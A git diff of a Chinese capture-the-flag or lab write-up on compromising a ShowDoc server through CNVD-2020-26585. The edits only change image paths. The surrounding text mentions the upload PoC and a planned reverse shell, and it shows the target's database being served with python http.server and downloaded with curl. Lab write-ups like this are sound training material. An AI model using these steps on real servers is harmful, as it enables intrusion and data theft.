@@ -41,9 +41,9 @@ Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds
 * 存在80-web端口
 ## web渗透
 发现了web就先访问了一下
-![](file-20260428170713217.png)
+![](assets/show靶机/file-20260501180438442.png)
 发现是一个`ShowDoc`的网站，应该是一套通用的源码。直接问ai了。
-![](file-20260428171350229.png)
+![](assets/show靶机/file-20260501180438436.png)
 找到了cve直接去搜poc了。
 [vulhub/showdoc/CNVD-2020-26585 在主节点 ·vulhub/vulhub ·GitHub](https://github.com/vulhub/vulhub/tree/master/showdoc/CNVD-2020-26585)
 poc:
@@ -67,9 +67,9 @@ Content-Type: text/plain
 ------WebKitFormBoundary0RdOKBR8AmAxfRyl--
 ```
 改一下host发包
-![](file-20260428172022367.png)
+![](assets/show靶机/file-20260501180438433.png)
 果然得到路径
-![](file-20260428172223661.png)
+![](assets/show靶机/file-20260501180438429.png)
 漏洞存在，接下来可以反弹shell了。
 
 ```bash
@@ -110,7 +110,7 @@ python3 -m http.server 8080
 #本机shell:
 PS D:\webtool\Dirsearch> curl http://10.241.108.8:8080/showdoc.db.php -O "showdoc.db.php"
 ```
-![](file-20260428181149330.png)
+![](assets/show靶机/file-20260501180438426.png)
 打开能看到我自己的用户和一个showdoc目录，但是可惜密码是哈希加密的，cmd5也没爆出来
 只能继续去找了，我们找一找配置文件
 ```zsh
